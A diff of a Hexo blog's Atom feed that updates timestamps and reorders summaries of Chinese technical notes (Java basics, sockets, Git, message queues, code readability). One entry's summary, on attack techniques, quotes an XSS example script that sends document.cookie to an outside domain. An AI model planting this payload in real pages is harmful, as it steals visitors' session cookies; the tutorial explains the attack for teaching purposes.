@@ -6,7 +6,7 @@
   <link href="/blog/atom.xml" rel="self"/>
   
   <link href="https://sometwo7.github.io/blog/"/>
-  <updated>2019-11-20T09:21:13.300Z</updated>
+  <updated>2019-12-05T12:21:17.148Z</updated>
   <id>https://sometwo7.github.io/blog/</id>
   
   <author>
@@ -17,11 +17,28 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title></title>
+    <link href="https://sometwo7.github.io/blog/0.html"/>
+    <id>https://sometwo7.github.io/blog/0.html</id>
+    <published>2019-12-05T12:21:17.148Z</published>
+    <updated>2019-12-05T12:21:17.148Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;JAVA基础&quot;&gt;&lt;a href=&quot;#JAVA基础&quot; class=&quot;headerlink&quot; title=&quot;JAVA基础&quot;&gt;&lt;/a&gt;JAVA基础&lt;/h1&gt;&lt;h2 id=&quot;JAVA中的几种基本数据类型是什么，各自占用多少字节。&quot;&gt;&lt;a href=&quot;#JAVA中的几种基本数据类型是什么，各自占用多少字节。&quot; class=&quot;headerlink&quot; title=&quot;JAVA中的几种基本数据类型是什么，各自占用多少字节。&quot;&gt;&lt;/a&gt;JAVA中的几种基本数据类型是什么，各自占用多少字节。&lt;/h2&gt;&lt;p&gt;8种基本数据类型，&lt;br&gt;byte，1&lt;br&gt;char，2&lt;br&gt;short，2&lt;br&gt;float，4&lt;br&gt;int，4&lt;br&gt;double，8&lt;br&gt;long，8&lt;br&gt;boolean，1 或 4，变量 boolean 占4个字节， boolean 数组占1个字节&lt;/p&gt;&lt;h2 id=&quot;String类能被继承吗，为什么。&quot;&gt;&lt;a href=&quot;#String类能被继承吗，为什么。&quot; class=&quot;headerlink&quot; title=&quot;String类能被继承吗，为什么。&quot;&gt;&lt;/a&gt;String类能被继承吗，为什么。&lt;/h2&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>Linux 环境搭建 - Solr 8.3.0</title>
     <link href="https://sometwo7.github.io/blog/46fcdcd9.html"/>
     <id>https://sometwo7.github.io/blog/46fcdcd9.html</id>
     <published>2019-11-13T16:18:19.000Z</published>
-    <updated>2019-11-20T09:21:13.300Z</updated>
+    <updated>2019-12-05T12:21:17.148Z</updated>
     
     <summary type="html">
     
@@ -49,7 +66,7 @@
     <link href="https://sometwo7.github.io/blog/f889c743.html"/>
     <id>https://sometwo7.github.io/blog/f889c743.html</id>
     <published>2019-11-13T14:08:19.000Z</published>
-    <updated>2019-11-20T09:21:13.300Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -77,7 +94,7 @@
     <link href="https://sometwo7.github.io/blog/eb01ca49.html"/>
     <id>https://sometwo7.github.io/blog/eb01ca49.html</id>
     <published>2019-11-05T10:04:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -102,7 +119,7 @@
     <link href="https://sometwo7.github.io/blog/5b4dafbb.html"/>
     <id>https://sometwo7.github.io/blog/5b4dafbb.html</id>
     <published>2019-11-05T10:03:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -123,15 +140,24 @@
   </entry>
   
   <entry>
-    <title>网络技术 - 代码可读性</title>
-    <link href="https://sometwo7.github.io/blog/1c7cd43d.html"/>
-    <id>https://sometwo7.github.io/blog/1c7cd43d.html</id>
+    <title>网络技术 - Socket</title>
+    <link href="https://sometwo7.github.io/blog/ecffdd03.html"/>
+    <id>https://sometwo7.github.io/blog/ecffdd03.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
-      &lt;h1 id=&quot;一、可读性的重要性&quot;&gt;&lt;a href=&quot;#一、可读性的重要性&quot; class=&quot;headerlink&quot; title=&quot;一、可读性的重要性&quot;&gt;&lt;/a&gt;一、可读性的重要性&lt;/h1&gt;&lt;p&gt;编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。&lt;/p&gt;&lt;p&gt;可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。&lt;/p&gt;&lt;p&gt;只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。&lt;/p&gt;&lt;h1 id=&quot;二、用名字表达代码含义&quot;&gt;&lt;a href=&quot;#二、用名字表达代码含义&quot; class=&quot;headerlink&quot; title=&quot;二、用名字表达代码含义&quot;&gt;&lt;/a&gt;二、用名字表达代码含义&lt;/h1&gt;
+      &lt;h1 id=&quot;一、I-O-模型&quot;&gt;&lt;a href=&quot;#一、I-O-模型&quot; class=&quot;headerlink&quot; title=&quot;一、I/O 模型&quot;&gt;&lt;/a&gt;一、I/O 模型&lt;/h1&gt;&lt;p&gt;一个输入操作通常包括两个阶段：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;等待数据准备好&lt;/li&gt;
+&lt;li&gt;从内核向进程复制数据&lt;/li&gt;
+&lt;/ul&gt;&lt;p&gt;对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。&lt;/p&gt;&lt;p&gt;Unix 有五种 I/O 模型：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;阻塞式 I/O&lt;/li&gt;
+&lt;li&gt;非阻塞式 I/O&lt;/li&gt;
+&lt;li&gt;I/O 复用（select 和 poll）&lt;/li&gt;
+&lt;li&gt;信号驱动式 I/O（SIGIO）&lt;/li&gt;
+&lt;li&gt;异步 I/O（AIO）&lt;/li&gt;
+&lt;/ul&gt;
     
     </summary>
     
@@ -139,7 +165,7 @@
       <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
     
     
-      <category term="代码" scheme="https://sometwo7.github.io/blog/tags/%E4%BB%A3%E7%A0%81/"/>
+      <category term="socket" scheme="https://sometwo7.github.io/blog/tags/socket/"/>
     
   </entry>
   
@@ -148,7 +174,7 @@
     <link href="https://sometwo7.github.io/blog/9956399c.html"/>
     <id>https://sometwo7.github.io/blog/9956399c.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -165,15 +191,15 @@
   </entry>
   
   <entry>
-    <title>网络技术 - Git</title>
-    <link href="https://sometwo7.github.io/blog/685bfdc8.html"/>
-    <id>https://sometwo7.github.io/blog/685bfdc8.html</id>
+    <title>网络技术 - 攻击技术</title>
+    <link href="https://sometwo7.github.io/blog/877061f8.html"/>
+    <id>https://sometwo7.github.io/blog/877061f8.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
-      &lt;h1 id=&quot;集中式与分布式&quot;&gt;&lt;a href=&quot;#集中式与分布式&quot; class=&quot;headerlink&quot; title=&quot;集中式与分布式&quot;&gt;&lt;/a&gt;集中式与分布式&lt;/h1&gt;&lt;p&gt;Git 属于分布式版本控制系统，而 SVN 属于集中式。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/1fe2dc77-9a2d-4643-90b3-bbf50f649bac.png&quot; width=&quot;600px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。&lt;/p&gt;&lt;p&gt;集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。&lt;/p&gt;&lt;p&gt;集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。&lt;/p&gt;
+      &lt;h1 id=&quot;一、跨站脚本攻击&quot;&gt;&lt;a href=&quot;#一、跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;一、跨站脚本攻击&quot;&gt;&lt;/a&gt;一、跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。&lt;/p&gt;&lt;h2 id=&quot;攻击原理&quot;&gt;&lt;a href=&quot;#攻击原理&quot; class=&quot;headerlink&quot; title=&quot;攻击原理&quot;&gt;&lt;/a&gt;攻击原理&lt;/h2&gt;&lt;p&gt;例如有一个论坛网站，攻击者可以在上面发布以下内容：&lt;/p&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;location.href=&lt;span class=&quot;string&quot;&gt;&quot;//domain.com/?c=&quot;&lt;/span&gt; + &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.cookie&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
     
     </summary>
     
@@ -181,31 +207,7 @@
       <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
     
     
-      <category term="git" scheme="https://sometwo7.github.io/blog/tags/git/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - 消息队列</title>
-    <link href="https://sometwo7.github.io/blog/51d10326.html"/>
-    <id>https://sometwo7.github.io/blog/51d10326.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;一、消息模型&quot;&gt;&lt;a href=&quot;#一、消息模型&quot; class=&quot;headerlink&quot; title=&quot;一、消息模型&quot;&gt;&lt;/a&gt;一、消息模型&lt;/h1&gt;&lt;h2 id=&quot;点对点&quot;&gt;&lt;a href=&quot;#点对点&quot; class=&quot;headerlink&quot; title=&quot;点对点&quot;&gt;&lt;/a&gt;点对点&lt;/h2&gt;&lt;p&gt;消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/206f965e-53b2-4732-90cf-75910b80d7ac.png&quot; width=&quot;450px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;h2 id=&quot;发布-订阅&quot;&gt;&lt;a href=&quot;#发布-订阅&quot; class=&quot;headerlink&quot; title=&quot;发布/订阅&quot;&gt;&lt;/a&gt;发布/订阅&lt;/h2&gt;&lt;p&gt;消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/4e93f7d4-2623-4129-a939-59051256561e.png&quot; width=&quot;450px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;发布与订阅模式和观察者模式有以下不同：&lt;/p&gt;&lt;ul&gt;
-&lt;li&gt;观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，生产者与消费者不知道对方的存在，它们之间通过频道进行通信。&lt;/li&gt;
-&lt;li&gt;观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="消息队列" scheme="https://sometwo7.github.io/blog/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
+      <category term="攻击" scheme="https://sometwo7.github.io/blog/tags/%E6%94%BB%E5%87%BB/"/>
     
   </entry>
   
@@ -214,7 +216,7 @@
     <link href="https://sometwo7.github.io/blog/7a9a193e.html"/>
     <id>https://sometwo7.github.io/blog/7a9a193e.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -241,7 +243,7 @@
     <link href="https://sometwo7.github.io/blog/78b8663.html"/>
     <id>https://sometwo7.github.io/blog/78b8663.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -261,11 +263,32 @@
   </entry>
   
   <entry>
+    <title>网络技术 - Git</title>
+    <link href="https://sometwo7.github.io/blog/685bfdc8.html"/>
+    <id>https://sometwo7.github.io/blog/685bfdc8.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2019-12-05T12:21:17.152Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;集中式与分布式&quot;&gt;&lt;a href=&quot;#集中式与分布式&quot; class=&quot;headerlink&quot; title=&quot;集中式与分布式&quot;&gt;&lt;/a&gt;集中式与分布式&lt;/h1&gt;&lt;p&gt;Git 属于分布式版本控制系统，而 SVN 属于集中式。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/1fe2dc77-9a2d-4643-90b3-bbf50f649bac.png&quot; width=&quot;600px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。&lt;/p&gt;&lt;p&gt;集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。&lt;/p&gt;&lt;p&gt;集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="git" scheme="https://sometwo7.github.io/blog/tags/git/"/>
+    
+  </entry>
+  
+  <entry>
     <title>网络技术 - SQL</title>
     <link href="https://sometwo7.github.io/blog/4ce9f201.html"/>
     <id>https://sometwo7.github.io/blog/4ce9f201.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -286,7 +309,7 @@
     <link href="https://sometwo7.github.io/blog/2355d11.html"/>
     <id>https://sometwo7.github.io/blog/2355d11.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -307,7 +330,7 @@
     <link href="https://sometwo7.github.io/blog/7a97d7b6.html"/>
     <id>https://sometwo7.github.io/blog/7a97d7b6.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -328,7 +351,7 @@
     <link href="https://sometwo7.github.io/blog/64a35ad1.html"/>
     <id>https://sometwo7.github.io/blog/64a35ad1.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -356,7 +379,7 @@
     <link href="https://sometwo7.github.io/blog/38ddab86.html"/>
     <id>https://sometwo7.github.io/blog/38ddab86.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -377,7 +400,7 @@
     <link href="https://sometwo7.github.io/blog/d350a2b7.html"/>
     <id>https://sometwo7.github.io/blog/d350a2b7.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -397,15 +420,15 @@
   </entry>
   
   <entry>
-    <title>网络技术 - 构建工具</title>
-    <link href="https://sometwo7.github.io/blog/4ad173cd.html"/>
-    <id>https://sometwo7.github.io/blog/4ad173cd.html</id>
+    <title>网络技术 - 代码可读性</title>
+    <link href="https://sometwo7.github.io/blog/1c7cd43d.html"/>
+    <id>https://sometwo7.github.io/blog/1c7cd43d.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
-      &lt;h1 id=&quot;一、构建工具的作用&quot;&gt;&lt;a href=&quot;#一、构建工具的作用&quot; class=&quot;headerlink&quot; title=&quot;一、构建工具的作用&quot;&gt;&lt;/a&gt;一、构建工具的作用&lt;/h1&gt;&lt;p&gt;构建工具是用于构建项目的自动化工具，主要包含以下工作：&lt;/p&gt;&lt;h2 id=&quot;依赖管理&quot;&gt;&lt;a href=&quot;#依赖管理&quot; class=&quot;headerlink&quot; title=&quot;依赖管理&quot;&gt;&lt;/a&gt;依赖管理&lt;/h2&gt;&lt;p&gt;不再需要手动导入 Jar 依赖包，并且可以自动处理依赖关系，也就是说某个依赖如果依赖于其它依赖，构建工具可以帮助我们自动处理这种依赖关系。&lt;/p&gt;&lt;h2 id=&quot;运行单元测试&quot;&gt;&lt;a href=&quot;#运行单元测试&quot; class=&quot;headerlink&quot; title=&quot;运行单元测试&quot;&gt;&lt;/a&gt;运行单元测试&lt;/h2&gt;&lt;p&gt;不再需要在项目代码中添加测试代码，从而避免了污染项目代码。&lt;/p&gt;&lt;h2 id=&quot;将源代码转化为可执行文件&quot;&gt;&lt;a href=&quot;#将源代码转化为可执行文件&quot; class=&quot;headerlink&quot; title=&quot;将源代码转化为可执行文件&quot;&gt;&lt;/a&gt;将源代码转化为可执行文件&lt;/h2&gt;
+      &lt;h1 id=&quot;一、可读性的重要性&quot;&gt;&lt;a href=&quot;#一、可读性的重要性&quot; class=&quot;headerlink&quot; title=&quot;一、可读性的重要性&quot;&gt;&lt;/a&gt;一、可读性的重要性&lt;/h1&gt;&lt;p&gt;编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。&lt;/p&gt;&lt;p&gt;可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。&lt;/p&gt;&lt;p&gt;只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。&lt;/p&gt;&lt;h1 id=&quot;二、用名字表达代码含义&quot;&gt;&lt;a href=&quot;#二、用名字表达代码含义&quot; class=&quot;headerlink&quot; title=&quot;二、用名字表达代码含义&quot;&gt;&lt;/a&gt;二、用名字表达代码含义&lt;/h1&gt;
     
     </summary>
     
@@ -413,58 +436,7 @@
       <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
     
     
-      <category term="构建工具" scheme="https://sometwo7.github.io/blog/tags/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - Socket</title>
-    <link href="https://sometwo7.github.io/blog/ecffdd03.html"/>
-    <id>https://sometwo7.github.io/blog/ecffdd03.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;一、I-O-模型&quot;&gt;&lt;a href=&quot;#一、I-O-模型&quot; class=&quot;headerlink&quot; title=&quot;一、I/O 模型&quot;&gt;&lt;/a&gt;一、I/O 模型&lt;/h1&gt;&lt;p&gt;一个输入操作通常包括两个阶段：&lt;/p&gt;&lt;ul&gt;
-&lt;li&gt;等待数据准备好&lt;/li&gt;
-&lt;li&gt;从内核向进程复制数据&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。&lt;/p&gt;&lt;p&gt;Unix 有五种 I/O 模型：&lt;/p&gt;&lt;ul&gt;
-&lt;li&gt;阻塞式 I/O&lt;/li&gt;
-&lt;li&gt;非阻塞式 I/O&lt;/li&gt;
-&lt;li&gt;I/O 复用（select 和 poll）&lt;/li&gt;
-&lt;li&gt;信号驱动式 I/O（SIGIO）&lt;/li&gt;
-&lt;li&gt;异步 I/O（AIO）&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="socket" scheme="https://sometwo7.github.io/blog/tags/socket/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络技术 - 攻击技术</title>
-    <link href="https://sometwo7.github.io/blog/877061f8.html"/>
-    <id>https://sometwo7.github.io/blog/877061f8.html</id>
-    <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;一、跨站脚本攻击&quot;&gt;&lt;a href=&quot;#一、跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;一、跨站脚本攻击&quot;&gt;&lt;/a&gt;一、跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。&lt;/p&gt;&lt;h2 id=&quot;攻击原理&quot;&gt;&lt;a href=&quot;#攻击原理&quot; class=&quot;headerlink&quot; title=&quot;攻击原理&quot;&gt;&lt;/a&gt;攻击原理&lt;/h2&gt;&lt;p&gt;例如有一个论坛网站，攻击者可以在上面发布以下内容：&lt;/p&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;location.href=&lt;span class=&quot;string&quot;&gt;&quot;//domain.com/?c=&quot;&lt;/span&gt; + &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.cookie&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-    
-    </summary>
-    
-    
-      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
-    
-    
-      <category term="攻击" scheme="https://sometwo7.github.io/blog/tags/%E6%94%BB%E5%87%BB/"/>
+      <category term="代码" scheme="https://sometwo7.github.io/blog/tags/%E4%BB%A3%E7%A0%81/"/>
     
   </entry>
   
@@ -473,7 +445,7 @@
     <link href="https://sometwo7.github.io/blog/bf574124.html"/>
     <id>https://sometwo7.github.io/blog/bf574124.html</id>
     <published>2019-11-05T10:02:11.000Z</published>
-    <updated>2019-11-20T09:21:13.304Z</updated>
+    <updated>2019-12-05T12:21:17.152Z</updated>
     
     <summary type="html">
     
@@ -486,6 +458,30 @@
     
     
       <category term="系统设计" scheme="https://sometwo7.github.io/blog/tags/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>网络技术 - 消息队列</title>
+    <link href="https://sometwo7.github.io/blog/51d10326.html"/>
+    <id>https://sometwo7.github.io/blog/51d10326.html</id>
+    <published>2019-11-05T10:02:11.000Z</published>
+    <updated>2019-12-05T12:21:17.152Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;一、消息模型&quot;&gt;&lt;a href=&quot;#一、消息模型&quot; class=&quot;headerlink&quot; title=&quot;一、消息模型&quot;&gt;&lt;/a&gt;一、消息模型&lt;/h1&gt;&lt;h2 id=&quot;点对点&quot;&gt;&lt;a href=&quot;#点对点&quot; class=&quot;headerlink&quot; title=&quot;点对点&quot;&gt;&lt;/a&gt;点对点&lt;/h2&gt;&lt;p&gt;消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/206f965e-53b2-4732-90cf-75910b80d7ac.png&quot; width=&quot;450px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;h2 id=&quot;发布-订阅&quot;&gt;&lt;a href=&quot;#发布-订阅&quot; class=&quot;headerlink&quot; title=&quot;发布/订阅&quot;&gt;&lt;/a&gt;发布/订阅&lt;/h2&gt;&lt;p&gt;消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/4e93f7d4-2623-4129-a939-59051256561e.png&quot; width=&quot;450px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;发布与订阅模式和观察者模式有以下不同：&lt;/p&gt;&lt;ul&gt;
+&lt;li&gt;观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，生产者与消费者不知道对方的存在，它们之间通过频道进行通信。&lt;/li&gt;
+&lt;li&gt;观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="消息队列" scheme="https://sometwo7.github.io/blog/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
     
   </entry>
   
